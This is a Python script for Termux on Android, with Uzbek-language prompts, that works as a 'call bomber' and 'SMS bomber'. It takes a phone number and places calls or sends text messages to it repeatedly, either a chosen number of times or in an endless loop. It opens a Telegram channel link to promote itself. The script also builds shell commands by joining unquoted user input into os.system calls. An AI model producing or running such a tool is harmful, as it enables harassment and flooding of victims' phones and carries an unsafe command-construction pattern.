def ddos(aaabb):
	import os, sys, time
	sana = 0
	bush = ' '
	def slowprint(s):
		for c in s + '\n' :
		       	sys.stdout.write(c)
		       	sys.stdout.flush()
		       	time.sleep(5. / 100)

		       			       	
	os.system("clear") 
	prin= ('''\033[91m   
 ____        _                _      
 |  _ \      | |              | |    
 | |_) | ___ | |__  _   _ _ __| |__  _ __ ___    
 |  _ < / _ \| '_ \| | | | '__| '_ \| '__/ _ \    
 | |_) | (_) | |_) | |_| | |  | |_) | | | (_) |    
 |____/ \___/|_.__/ \__,_|_|  |_.__/|_|  \___/     
''')
	print(prin)

	slowprint('''\033[93m
\tEslatma!\n\tOxirigacha o`qing\nBu scripdan foydalanish uchun sizning Termuxizda Termux:API o`rnatilgan bo`lishi kerak.
Boshlash uchun "enter"ni bosing.
Dasturni to`tatish uchun CTRL + C ni bosing.
Bizning kanalga obuna bo`lishni esdan chiqarmang t.me/Boburbro_tg
	''')
	os.system("termux-open-url https://t.me/Boburbro_tg")
	input('')
	
	n = input('Nomer kiriting\n->')
	dd = int(input('[1] call bomber\n[2] sms bomber\n->'))
	
	if dd == 1:
		a = int(input('Nechamarotaba takrorlansin\nAgar cheksizmarta takrorlanishi kerak bo\'lsa 1 ni kiriting\n->'))
		if a == 1:
		 	while True:
		 		os.system("termux-telephony-call " + n)
		 		sana += 1
		 		print(n,'ga ', sana,' marta q`ng`iroq qilindi')
		if a > 0:
			for i in range(a):
				os.system("termux-telephony-call " + n)
				sana += 1
				print(n,'ga ', sana,' marta qo`ng`iroq qilindi')
				
	
	if dd == 2:
		text = input('Yuborish uchun biron bir matin kiriting\n->')
		a = int(input('Nechamarotaba takrorlansin\nAgar cheksizmarta takrorlanishi kerak bo\'lsa 1 ni kiriting\n->'))
		
		if a == 1:
		 	while True:
		 		os.system("termux-sms-send -n "+ n +bush  + text)
		 		sana += 1
		 		print(n,'ga',sana,'marta',text,'matni yuborildi')
		if a > 0:
			for i in range(a):
				os.system("termux-sms-send -n "+ n + bush + text)
				sana += 1
				print(n,'ga',sana,'marta',text,'matni yuborildi')
				
				
				

	